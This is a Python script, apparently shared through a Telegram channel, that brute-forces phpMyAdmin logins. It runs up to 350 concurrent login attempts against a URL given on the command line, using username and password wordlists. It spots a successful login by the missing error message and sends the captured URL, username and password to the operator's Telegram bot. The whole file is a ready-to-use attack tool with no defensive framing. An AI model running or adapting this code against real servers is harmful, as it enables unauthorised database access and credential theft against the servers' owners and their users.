#https://t.me/lostsouls_crypto

import sys
import requests
from concurrent.futures import ThreadPoolExecutor

# Настройки
url = sys.argv[1] 
usernames_file = "users.txt"  # Файл с именами пользователей
passwords_file = "password.txt"  # Файл с паролями
max_threads = 350  # Максимальное количество потоков, желательно поставить меньше

pma_token = '3a938490a950f20403d78c2f240a0f28' #поменять на свой

telegram_token = '' #токен бота
telegram_chat_id = '' #юзерайди

found = 0

def send_telegram_message(bot_token, chat_id, message):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": message,
        "parse_mode": 'MarkdownV2'
    }
    try:
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            print("Сообщение успешно отправлено!")
        else:
            print(f"Ошибка при отправке сообщения: {response.status_code}, {response.text}")
    except requests.RequestException as e:
        print(f"Ошибка соединения: {e}")


def attempt_login(username, password):
    data = {
    'pma_username': username,
    'pma_password': password,
    'server': '2',
    'target': 'server_variables.php',
    'token': pma_token,
}

    try:
        response = requests.post(url, data=data)
        if '''<div class="error"><img src="themes/dot.gif" title="" alt="" class="icon ic_s_error" />''' not in response.text:  # Условие для успешного входа
            print(f"[УСПЕХ] Найдено! Пользователь: {username}, Пароль: {password}")
            send_telegram_message(telegram_token, telegram_chat_id, f'‼️PMA BRUTEFORCE FOUND\nUrl: `{url}`\nUsername: `{username}`\nPassword: `{password}`')
            return True
        else:
            err = response.text.split('''<div class="error"><img src="themes/dot.gif" title="" alt="" class="icon ic_s_error" />''')[1].split('</div><noscript>')[0]
            print(f"[{err}] {username}:{password}")
    except requests.RequestException as e:
        print(f"[ОШИБКА] {e}")
    return False


def brute_force():
    with open(usernames_file, "r") as user_file:
        usernames = [line.strip() for line in user_file.readlines()]

    with open(passwords_file, "r") as pass_file:
        passwords = [line.strip() for line in pass_file.readlines()]

    # Создание задач для потоков
    with ThreadPoolExecutor(max_threads) as executor:
        futures = []
        for username in usernames:
            for password in passwords:
                futures.append(executor.submit(attempt_login, username, password))

        # Ожидание завершения задач
        for future in futures:
            if future.result():
                print("[ИНФО] Остановлено, так как найден успешный вход.")
                executor.shutdown(wait=False)
                return

    print("Брутфорс завершен. Пароль не найден.")


if __name__ == "__main__":
    brute_force()
